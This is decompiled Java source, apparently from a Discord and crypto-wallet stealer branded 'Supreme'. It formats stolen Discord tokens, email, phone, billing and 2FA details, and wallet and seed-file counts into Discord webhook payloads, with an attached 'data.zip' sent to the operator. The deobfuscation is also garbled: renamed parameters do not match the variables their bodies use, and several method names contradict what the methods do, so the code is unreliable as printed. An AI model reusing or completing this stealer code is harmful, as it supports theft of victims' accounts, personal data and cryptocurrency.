/*\n * ========================================\n * DEOBFUSCATED: WebhookFormatter.java\n * Original: d/a.java\n * ----------------------------------------\n * Webhook mesaj biçimlendirici - Discord components API (v2) ile veri formatlar (485 satır)\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package d;

import c.c$EmbedObject;
import c.c$EmbedObject$Author;
import c.c$EmbedObject$Field;
import d.b;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public final class a {
    public static final int MAX_PAYLOAD_SIZE = 32768;
    public static final int EMBED_COLOR = 10181046;
    public static final String FOOTER_KEY = "__KEY_FOOTER__";

    private a() {
    }

    public static boolean isTokenEmbeformatFriendEmbed(c$EmbedObject c$EmbedObject) {
        return c$EmbedObject != null && c$EmbedObject.getAuthor() != null && c$EmbedObject.getDescription() != null && c$EmbedObject.getDescription().contains("**Token**");
    }

    public static boolean isWalletEmbed(c$EmbedObject c$EmbedObject) {
        if (c$EmbedObject == null || c$EmbedObject.getTitle() == null) {
            return false;
        }
        String string = c$EmbedObject.getTitle().trim().toLowerCase();
        return string.startsWith("hq friends") || string.startsWith("friend list");
    }

    public static String formatWalletEmbed(c$EmbedObject c$EmbedObject) {
        if (c$EmbedObject == null) {
            return "";
        }
        String string = c$EmbedObject.getTitle();
        if (string != null && "Wallets".equalsIgnoreCase(string.trim())) {
            return d.a.i(c$EmbedObject);
        }
        if (d.a.b(c$EmbedObject)) {
            return d.a.formatGenericEmbed(c$EmbedObject);
        }
        if (d.a.a(c$EmbedObject)) {
            return d.a.extractAuthorName(c$EmbedObject);
        }
        return d.a.extractEmbedFields(c$EmbedObject);
    }

    public static b parseFriendEmbed(c$EmbedObject c$EmbedObject) {
        Object object;
        CharSequence charSequence;
        c$EmbedObject$Author c$EmbedObject$Author = c$EmbedObject != null ? c$EmbedObject.getAuthor() : null;
        String string = c$EmbedObject$Author != null && c$EmbedObject$Author.getName() != null ? c$EmbedObject$Author.getName() : "@unknown";
        string = d.a.b(string);
        String string2 = string.startsWith("@") ? string.substring(1) : string;
        CharSequence charSequence2 = "";
        if (c$EmbedObject != null && c$EmbedObject.getTitle() != null && ((String)(charSequence = c$EmbedObject.getTitle().trim())).matches("\\d{5,}")) {
            charSequence2 = charSequence;
        }
        charSequence = new StringBuilder("### ");
        ((StringBuilder)charSequence).append(string);
        if (!charSequence2.isEmpty()) {
            ((StringBuilder)charSequence).append(" (").append((String)charSequence2).append(")");
        }
        ((StringBuilder)charSequence).append(" \u00b7 Supreme");
        String string3 = c$EmbedObject != null && c$EmbedObject.getDescription() != null ? c$EmbedObject.getDescription() : "";
        String string4 = d.a.a(string3, "BADGES:");
        String string5 = d.a.a(string3, "TOKEN:");
        String string6 = d.a.a(string3, "FIELDS:");
        if (string4.isEmpty() && string5.isEmpty() && string6.isEmpty()) {
            return d.a.a(((StringBuilder)charSequence).toString(), string2, string3);
        }
        String string7 = "``" + string2 + "``";
        if (!string4.isEmpty() && !string4.equalsIgnoreCase("None")) {
            string7 = string7 + " | " + string4.trim();
        }
        if (!((String)(object = string5)).isEmpty() && !((String)object).startsWith("```")) {
            object = "```" + (String)object + "```";
        }
        return new b(((StringBuilder)charSequence).toString(), string7, (String)object, string6.trim());
    }

    private static b createEmbedDto(String heading, String user, String token) {
        String string4 = "";
        Object object = "";
        String string5 = "";
        if (string3 != null) {
            int n2;
            String string6;
            int n3;
            int n4 = d.a.a(string3);
            String string7 = n4 >= 0 ? string3.substring(0, n4) : string3;
            String string8 = n4 >= 0 ? string3.substring(n4) : "";
            int n5 = string7.indexOf("**badges:**");
            if (n5 >= 0 && (n3 = (string6 = (n2 = string7.indexOf(10, n5)) >= 0 ? string7.substring(n5, n2) : string7.substring(n5)).indexOf(58)) >= 0) {
                string4 = string6.substring(n3 + 1).trim();
            }
            StringBuilder stringBuilder = new StringBuilder();
            for (String string9 : string7.split("\n")) {
                String string10 = string9.trim();
                if (!string10.contains("**e-mail:**") && !string10.contains("**Email:**") && !string10.contains("**phone:**") && !string10.contains("**Phone:**") && !string10.contains("**billing:**") && !string10.contains("**Billing:**") && !string10.contains("**2fa:**") && !string10.contains("**MFA:**")) continue;
                if (stringBuilder.length() > 0) {
                    stringBuilder.append("\n");
                }
                stringBuilder.append(string10);
            }
            string5 = stringBuilder.toString();
            if (string8.startsWith("**Token:**")) {
                object = string8.substring("**Token:**".length()).trim();
            } else if (string8.contains("```")) {
                int n6 = string8.indexOf("```");
                object = string8.substring(n6).trim();
            }
        }
        String string11 = "``" + string2 + "``";
        if (!string4.isEmpty() && !string4.equalsIgnoreCase("None")) {
            string11 = string11 + " | " + string4;
        }
        if (!((String)object).isEmpty() && !((String)object).startsWith("```")) {
            object = "```" + (String)object + "```";
        }
        return new b(string, string11, (String)object, string5);
    }

    private static String fallback(String value, String def) {
        if (string == null) {
            return "";
        }
        int n2 = string.indexOf(string2);
        if (n2 < 0) {
            return "";
        }
        int n3 = n2 + string2.length();
        int n4 = string.length();
        String[] stringArray = new String[]{"BADGES:", "TOKEN:", "FIELDS:"};
        for (String string3 : stringArray) {
            int n5;
            if (string3.equals(string2) || (n5 = string.indexOf(string3, n3)) < 0 || n5 >= n4) continue;
            n4 = n5;
        }
        return string.substring(n3, n4).trim();
    }

    private static int parseColor(String hex) {
        if (string == null) {
            return -1;
        }
        int n2 = string.indexOf("**Token:**");
        if (n2 >= 0) {
            return n2;
        }
        return string.indexOf("**Token**");
    }

    static String extractUsername(String author) {
        String string2;
        int n2;
        if (string == null || string.trim().isEmpty()) {
            return "@unknown";
        }
        Object object = string.trim();
        int n3 = ((String)object).indexOf(124);
        if (n3 >= 0) {
            object = ((String)object).substring(n3 + 1).trim();
        }
        if (((String)(object = ((String)object).replace("Discord Account", "").trim())).endsWith(")") && (n2 = ((String)object).lastIndexOf(" (")) > 0 && (string2 = ((String)object).substring(n2 + 2, ((String)object).length() - 1).trim()).matches("\\d{5,}")) {
            object = ((String)object).substring(0, n2).trim();
        }
        if (!((String)object).startsWith("@")) {
            object = "@" + (String)object;
        }
        if (((String)object).equals("@") || ((String)object).equalsIgnoreCase("@unknown")) {
            return "@unknown";
        }
        return (String)object;
    }

    public static String getAuthorUsername(c$EmbedObject c$EmbedObject) {
        String string;
        b b2 = d.a.d(c$EmbedObject);
        StringBuilder stringBuilder = new StringBuilder();
        if (!b2.a.isEmpty()) {
            stringBuilder.append(b2.a);
        }
        if (!b2.b.isEmpty()) {
            if (stringBuilder.length() > 0) {
                stringBuilder.append("\n\n");
            }
            stringBuilder.append(b2.b);
        }
        if (!b2.c.isEmpty()) {
            if (stringBuilder.length() > 0) {
                stringBuilder.append("\n");
            }
            stringBuilder.append(b2.c);
        }
        if (!b2.d.isEmpty()) {
            if (stringBuilder.length() > 0) {
                stringBuilder.append("\n\n");
            }
            stringBuilder.append(b2.d);
        }
        if ((string = stringBuilder.toString().trim()).length() > 3900) {
            string = string.substring(0, 3900);
        }
        return string;
    }

    public static String formatBadgesEmbed(c$EmbedObject c$EmbedObject) {
        if (c$EmbedObject == null) {
            return null;
        }
        if (c$EmbedObject.getThumbnail() != null && c$EmbedObject.getThumbnail().getUrl() != null && !c$EmbedObject.getThumbnail().getUrl().isEmpty()) {
            return c$EmbedObject.getThumbnail().getUrl();
        }
        if (c$EmbedObject.getAuthor() != null && c$EmbedObject.getAuthor().getIconUrl() != null && !c$EmbedObject.getAuthor().getIconUrl().isEmpty()) {
            return c$EmbedObject.getAuthor().getIconUrl();
        }
        return null;
    }

    public static String formatEmbedGeneric(c$EmbedObject c$EmbedObject) {
        Object object;
        Object object2;
        StringBuilder stringBuilder = new StringBuilder();
        String string = c$EmbedObject.getTitle();
        if (string != null && !string.isEmpty()) {
            if (string.toLowerCase().startsWith("friend list")) {
                stringBuilder.append("### ").append(string).append("\n");
            } else {
                object2 = c$EmbedObject.getAuthor();
                object = object2 != null && ((c$EmbedObject$Author)object2).getName() != null ? ((c$EmbedObject$Author)object2).getName() : "@unknown";
                String string2 = object;
                if (!((String)object).startsWith("@")) {
                    object = "@" + (String)object;
                }
                stringBuilder.append("### Friend List | ").append((String)object).append("\n");
            }
        }
        if ((object2 = c$EmbedObject.getDescription()) != null && !((String)object2).trim().isEmpty()) {
            stringBuilder.append(((String)object2).trim());
        }
        if (((String)(object = stringBuilder.toString().trim())).length() > 3900) {
            object = ((String)object).substring(0, 3900);
        }
        return object;
    }

    private static String extractFieldsSection(c$EmbedObject c$EmbedObject) {
        String string;
        List<c$EmbedObject$Field> list;
        String string2;
        StringBuilder stringBuilder = new StringBuilder();
        String string3 = c$EmbedObject.getTitle();
        if (string3 != null && !string3.isEmpty()) {
            stringBuilder.append("**").append(string3).append("**\n\n");
        }
        if ((string2 = c$EmbedObject.getDescription()) != null && !string2.trim().isEmpty()) {
            stringBuilder.append(string2.trim()).append("\n\n");
        }
        if ((list = c$EmbedObject.getFields()) != null) {
            for (c$EmbedObject$Field c$EmbedObject$Field : list) {
                if (c$EmbedObject$Field == null) continue;
                String string4 = c$EmbedObject$Field.getName();
                String string5 = c$EmbedObject$Field.getValue();
                if (string4 == null || string4.isEmpty()) continue;
                if (string5 == null) {
                    string5 = "";
                }
                stringBuilder.append("**").append(string4).append("**\n").append(string5).append("\n\n");
            }
        }
        if ((string = stringBuilder.toString().trim()).length() > 3900) {
            string = string.substring(0, 3900);
        }
        return string;
    }

    public static String i(c$EmbedObject c$EmbedObject) {
        String string;
        String string2;
        String string3;
        String string4;
        String string5;
        HashMap<String, String> hashMap = new HashMap<String, String>();
        String string6 = null;
        List<c$EmbedObject$Field> list = c$EmbedObject != null ? c$EmbedObject.getFields() : null;
        List<c$EmbedObject$Field> list2 = list;
        if (list != null) {
            for (c$EmbedObject$Field object2 : list) {
                if (object2 == null || object2.getName() == null) continue;
                string5 = object2.getName().trim();
                string4 = object2.getValue() != null ? object2.getValue().trim() : "";
                string3 = string4;
                if ("Found".equalsIgnoreCase(string5)) {
                    string6 = string4;
                    continue;
                }
                hashMap.put(string5.toLowerCase(), string4);
            }
        }
        String string7 = d.a.a(hashMap, "browser", "0");
        String string8 = d.a.a(hashMap, "desktop", "0");
        string5 = d.a.a(hashMap, "cold", "0");
        string4 = d.a.a(hashMap, "wallet.dat", "0");
        if ("0".equals(string4) && !hashMap.containsKey("wallet.dat")) {
            string4 = d.a.b(hashMap, "wallet", "0");
        }
        if ("0".equals(string2 = d.a.a(hashMap, "seed files", "0")) && !hashMap.containsKey("seed files")) {
            string2 = d.a.b(hashMap, "seed", "0");
        }
        string3 = d.a.a(hashMap, "total", "0");
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("Browser       Desktop       Cold\n");
        stringBuilder.append(d.a.a(string7, 13)).append(d.a.a(string8, 13)).append(string5).append("\n\n");
        stringBuilder.append("wallet.dat    Seed Files    Total\n");
        stringBuilder.append(d.a.a(string4, 13)).append(d.a.a(string2, 13)).append(string3);
        StringBuilder stringBuilder2 = new StringBuilder();
        stringBuilder2.append("**Wallets**\n\n");
        stringBuilder2.append("```\n").append((CharSequence)stringBuilder).append("\n```\n");
        if (string6 != null && !string6.isEmpty()) {
            stringBuilder2.append("\n**Found**\n").append(string6);
            if (!string6.endsWith("\n")) {
                stringBuilder2.append("\n");
            }
        }
        if ((string = stringBuilder2.toString().trim()).length() > 3900) {
            string = string.substring(0, 3900);
        }
        return string;
    }

    private static String getMapValue(Map<String, String> map, String key, String def) {
        String string3 = map.get(string);
        return string3 == null || string3.isEmpty() ? string2 : string3;
    }

    private static String findMapByPartialKey(Map<String, String> map, String partial, String def) {
        for (Map.Entry<String, String> entry : map.entrySet()) {
            if (entry.getKey() == null || !entry.getKey().contains(string)) continue;
            return entry.getValue() != null && !entry.getValue().isEmpty() ? entry.getValue() : string2;
        }
        return string2;
    }

    private static String truncate(String s, int max) {
        if (string == null) {
            string = "0";
        }
        if (string.length() >= n2) {
            return string.substring(0, n2);
        }
        StringBuilder stringBuilder = new StringBuilder(string);
        while (stringBuilder.length() < n2) {
            stringBuilder.append(' ');
        }
        return stringBuilder.toString();
    }

    public static String buildPayload(String url, String key, String hwid, boolean withFile) {
        return d.a.a(string, string2, string3, bl, null);
    }

    public static String buildPayloadFull(String url, String key, String hwid, boolean withFile, String string4) {
        String string5 = string3 == null ? "" : string3;
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("{\"type\":10,\"content\":").append(d.a.c(string5)).append("}");
        stringBuilder.append(",{\"type\":14,\"divider\":true,\"spacing\":1}");
        if (bl) {
            stringBuilder.append(",{\"type\":13,\"file\":{\"url\":\"attachment://data.zip\"}}");
            stringBuilder.append(",{\"type\":14,\"divider\":false,\"spacing\":1}");
        }
        stringBuilder.append(",{\"type\":10,\"content\":").append(d.a.c("-# __KEY_FOOTER__")).append("}");
        return d.a.c(string, string2, stringBuilder.toString());
    }

    public static String buildEmbedPayload(String url, String key, b dto, String hwid) {
        if (b2 == null) {
            b2 = new b("", "", "", "");
        }
        StringBuilder stringBuilder = new StringBuilder();
        String string4 = b2.a.isEmpty() ? "### @unknown \u00b7 Supreme" : b2.a;
        stringBuilder.append("{\"type\":10,\"content\":").append(d.a.c(string4)).append("}");
        stringBuilder.append(",{\"type\":14,\"divider\":true,\"spacing\":1}");
        String string5 = b2.b.isEmpty() ? "``unknown``" : b2.b;
        String string6 = b2.c;
        if (string3 != null && !string3.isEmpty()) {
            stringBuilder.append(",{\"type\":9,\"components\":[");
            stringBuilder.append("{\"type\":10,\"content\":").append(d.a.c(string5)).append("}");
            if (!string6.isEmpty()) {
                stringBuilder.append(",{\"type\":10,\"content\":").append(d.a.c(string6)).append("}");
            }
            stringBuilder.append("],\"accessory\":{\"type\":11,\"media\":{\"url\":").append(d.a.c(string3)).append("}}}");
        } else {
            stringBuilder.append(",{\"type\":10,\"content\":").append(d.a.c(string5)).append("}");
            if (!string6.isEmpty()) {
                stringBuilder.append(",{\"type\":10,\"content\":").append(d.a.c(string6)).append("}");
            }
        }
        if (!b2.d.isEmpty()) {
            stringBuilder.append(",{\"type\":14,\"divider\":true,\"spacing\":1}");
            stringBuilder.append(",{\"type\":10,\"content\":").append(d.a.c(b2.d)).append("}");
        }
        stringBuilder.append(",{\"type\":14,\"divider\":true,\"spacing\":1}");
        stringBuilder.append(",{\"type\":10,\"content\":").append(d.a.c("-# __KEY_FOOTER__")).append("}");
        return d.a.c(string, string2, stringBuilder.toString());
    }

    public static String buildSimplePayload(String url, String key, String hwid) {
        String string4 = string3 == null ? "" : string3;
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("{\"type\":10,\"content\":").append(d.a.c(string4)).append("}");
        stringBuilder.append(",{\"type\":14,\"divider\":true,\"spacing\":1}");
        stringBuilder.append(",{\"type\":10,\"content\":").append(d.a.c("-# __KEY_FOOTER__")).append("}");
        return d.a.c(string, string2, stringBuilder.toString());
    }

    private static String buildJsonHeader(String url, String key, String hwid) {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("{");
        stringBuilder.append("\"username\":").append(d.a.c(string == null ? "Supreme" : string)).append(",");
        stringBuilder.append("\"avatar_url\":").append(d.a.c(string2 == null ? "" : string2)).append(",");
        stringBuilder.append("\"flags\":").append(32768).append(",");
        stringBuilder.append("\"components\":[{");
        stringBuilder.append("\"type\":17,");
        stringBuilder.append("\"accent_color\":").append(10181046).append(",");
        stringBuilder.append("\"components\":[").append(string3).append("]");
        stringBuilder.append("}]}");
        return stringBuilder.toString();
    }

    public static String buildComponentPayload(String url, String key, String hwid) {
        StringBuilder stringBuilder = new StringBuilder("{");
        stringBuilder.append("\"username\":").append(d.a.c(string == null ? "Supreme" : string)).append(",");
        stringBuilder.append("\"avatar_url\":").append(d.a.c(string2 == null ? "" : string2)).append(",");
        stringBuilder.append("\"content\":").append(d.a.c(string3 == null ? "@everyone" : string3));
        stringBuilder.append("}");
        return stringBuilder.toString();
    }

    private static String cleanMarkdown(String s) {
        if (string == null) {
            return "\"\"";
        }
        StringBuilder stringBuilder = new StringBuilder("\"");
        block7: for (int i2 = 0; i2 < string.length(); ++i2) {
            char c2 = string.charAt(i2);
            switch (c2) {
                case '\"': {
                    stringBuilder.append("\\\"");
                    continue block7;
                }
                case '\\': {
                    stringBuilder.append("\\\\");
                    continue block7;
                }
                case '\n': {
                    stringBuilder.append("\\n");
                    continue block7;
                }
                case '\r': {
                    stringBuilder.append("\\r");
                    continue block7;
                }
                case '\t': {
                    stringBuilder.append("\\t");
                    continue block7;
                }
                default: {
                    if (c2 < ' ') {
                        stringBuilder.append(String.format("\\u%04x", Character.valueOf(c2)));
                        continue block7;
                    }
                    stringBuilder.append(c2);
                }
            }
        }
        stringBuilder.append("\"");
        return stringBuilder.toString();
    }
}

